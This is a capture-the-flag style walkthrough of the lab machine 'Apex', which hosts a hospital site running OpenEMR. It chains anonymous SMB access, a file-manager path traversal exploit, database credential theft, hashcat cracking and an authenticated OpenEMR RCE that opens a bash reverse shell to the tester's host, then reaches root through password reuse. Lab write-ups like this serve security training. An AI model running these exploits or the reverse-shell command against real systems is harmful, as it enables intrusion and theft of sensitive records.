---
icon: ubuntu
---

# Apex - Intermediate

## Gaining access:

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.198.145 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 20:00 EDT
Nmap scan report for 192.168.198.145
Host is up (0.029s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: APEX Hospital
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 32
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, SupportsCompression, IgnoreSpaceBeforeParenthesis, LongColumnFlag, Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, SupportsTransactions, FoundRows, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongPassword, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: a1lP*!e\ztU-|PWF7~;H
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: APEX

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: apex
|   NetBIOS computer name: APEX\x00
|   Domain name: \x00
|   FQDN: apex
|_  System time: 2025-09-18T20:02:08-04:00
|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-09-19T00:02:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   26.94 ms 192.168.45.1
2   26.13 ms 192.168.45.254
3   29.99 ms 192.168.251.1
4   30.06 ms 192.168.198.145
```

### SMB Anonymous Login

```
smbclient -N -L \\\\192.168.198.145\\
```

<figure><img src="../../.gitbook/assets/image (1663).png" alt=""><figcaption></figcaption></figure>

It looks like anonymous login is enabled, and the first share that catches my eye is docs I am going to check it out

```
smbclient -N \\\\192.168.198.145\\docs
```

<figure><img src="../../.gitbook/assets/image (1664).png" alt=""><figcaption></figcaption></figure>

I downloaded the 2 pdf files and skimmed through them. Both of the documents provide us with a link to a github repo, We should look for some possible credentials or config files

<figure><img src="../../.gitbook/assets/image (1665).png" alt=""><figcaption></figcaption></figure>

Searching the repo for hardcoded passwords

<figure><img src="../../.gitbook/assets/image (1667).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1668).png" alt=""><figcaption></figcaption></figure>

Let's take a closer look at the file

<figure><img src="../../.gitbook/assets/image (1669).png" alt=""><figcaption></figcaption></figure>

I am going to note these credentials down for later use, and move to enumerating the Website on port 80.

### HTTP Port 80 TCP

<figure><img src="../../.gitbook/assets/image (1670).png" alt=""><figcaption></figcaption></figure>

The Scheduler button actually takes us to the OpenEMR application

<figure><img src="../../.gitbook/assets/image (1671).png" alt=""><figcaption></figcaption></figure>

Since we have discovered a login page, we can try the <mark style="color:$success;">**openemr**</mark> credentials that we have found on sqlconf.php earlier but it wouldn’t work. I am going to start directory busting

### Feroxbuster

```
feroxbuster -u http://192.168.198.145
```

<figure><img src="../../.gitbook/assets/image (1673).png" alt=""><figcaption></figcaption></figure>

Running feroxbuster 2 paths catch my eye, we have already discovered openemr on our own but there is also a filemanager. I will keep that in mind and i will try to run a more focused directory enumeration on openemr using Gobuster

```
gobuster dir -u http://192.168.198.145/openemr -w ~/tools/SecLists/Discovery/Web-Content/raft-small-files.txt -t 70
```

<figure><img src="../../.gitbook/assets/image (1674).png" alt=""><figcaption></figcaption></figure>

The “/openemr/admin.php” reveals that we are running OpenEMR Version 5.0.1 (1). This is an important information as it might help us to find exploits for OpenEMR.

<figure><img src="../../.gitbook/assets/image (1675).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1676).png" alt=""><figcaption></figcaption></figure>

After examining the different exploits for OpenEMR 5.0.1, we are unable to leverage on it as they require a credential to exploit

### **FileManager**

Among the result, “/filemanager” looks the most interesting so let’s take a look. Upon visiting the webpage, we discovered that there are files available on it and we even have the ability to upload files.

<figure><img src="../../.gitbook/assets/image (1677).png" alt=""><figcaption></figcaption></figure>

Clicking into the “Documents” folder, we are greeted with a familiar sight. It seems like this folder was linked to the same folder as the SMB share

<figure><img src="../../.gitbook/assets/image (1678).png" alt=""><figcaption></figcaption></figure>

On the top right hand corner, there is a button that shows the application information.

<figure><img src="../../.gitbook/assets/image (1679).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1680).png" alt=""><figcaption></figcaption></figure>

Since now we have the application version, we can do a check using searchsploit for any exploits

### Filemanager 8.13.4 Path Traversal Exploit

<figure><img src="../../.gitbook/assets/image (1681).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m 49359
```

<figure><img src="../../.gitbook/assets/image (1682).png" alt=""><figcaption></figcaption></figure>

The exploit requires the sessionid as well

To get the PHP Session ID, simply browse to http://\<IP>/filemanager and open Web Developer Tools (Ctrl+Shift+I) on firefox. Navigate to Storage > Cookies.

And I had to make two more changes to the code for the exploit to work. I had to change the path and the url\_path to Documents

<figure><img src="../../.gitbook/assets/image (1683).png" alt=""><figcaption></figcaption></figure>

```
python3 49359.py http://192.168.198.145/ PHPSESSID=5p9kuuoqa85cefldd06c26e5l8 /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (1684).png" alt=""><figcaption></figcaption></figure>

From the output, we saw that the Copy and Paste Clipboard function was executed but it looks like the read\_file function is not working properly. However, we can navigate to the filemanager's Documents folder to see if the paste\_clipboard really work as shown

<figure><img src="../../.gitbook/assets/image (1685).png" alt=""><figcaption></figcaption></figure>

Interestingly, we saw that the passwd file was copied and pasted. Since the exploit is working properly, we can leverage this to copy the sqlconf.php file that might contain potential SQL password

To copy the sqlconf.php file, we can execute the commands below. Just a note, the path for OpenEMR is located under “/var/www” instead of “/var/www/html” (I tried the exploit using “/var/www/html” and it doesn’t work so a trial and error was needed before I managed to copy the sqlconf.php”)

```
python3 49359.py http://192.168.198.145/ PHPSESSID=5p9kuuoqa85cefldd06c26e5l8 /var/www/openemr/sites/default/sqlconf.php
```

<figure><img src="../../.gitbook/assets/image (1686).png" alt=""><figcaption></figcaption></figure>

In this case, since we have copied sqlconf.php, we can only view the file under the SMB share as viewing the file under FileManager/Documents url will not be shown as the PHP file would be processed by the server side instead

<figure><img src="../../.gitbook/assets/image (1687).png" alt=""><figcaption></figcaption></figure>

Opening sqlconf.php, we discovered credentials in it.

<figure><img src="../../.gitbook/assets/image (1688).png" alt=""><figcaption></figcaption></figure>

Using the credentials, we are able to login the database using mysql.

### Enumerating Mysql

```
mysql -h 192.168.198.145 -u openemr -pC78maEQUIEuQ --skip-ssl
```

<figure><img src="../../.gitbook/assets/image (1690).png" alt=""><figcaption></figcaption></figure>

Since there is only 1 databases and large number of tables, we have to make smart choice on which tables to enumerate in order to save time.

We can navigate to OpenEMR github repositories under sql folder, database.sql file to enumerate for column storing passwords.

<figure><img src="../../.gitbook/assets/image (1689).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1691).png" alt=""><figcaption></figcaption></figure>

### Cracking admin's password

```
hashcat -m 3200 admin_hash /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (1692).png" alt=""><figcaption></figcaption></figure>

Using the cracked credentials, we are able to login the OpenEMR login interface as Adnministrator.

<figure><img src="../../.gitbook/assets/image (1693).png" alt=""><figcaption></figcaption></figure>

Since we are able to log in the OpenEMR as an Administrator user, we can use it for OpenEMR exploit that requires credentials to execute.

After trying several OpenEMR exploits, we are able to get a reverse shell using 45161.py

### OpenEMR 5.0.1 RCE Authenticated Exploit

<figure><img src="../../.gitbook/assets/image (1695).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m 45161.py
```

```
python2 45161.py http://192.168.198.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.158/80 0>&1'
```

<figure><img src="../../.gitbook/assets/image (1696).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1697).png" alt=""><figcaption></figcaption></figure>

## Privelege Escalation

### Password Reuse

Since the password we gotten from sqlconf.php is for admin user, we can try to reuse the password for root user credential. Upon entering the password, we are now authenticated as root user!

<figure><img src="../../.gitbook/assets/image (1698).png" alt=""><figcaption></figcaption></figure>
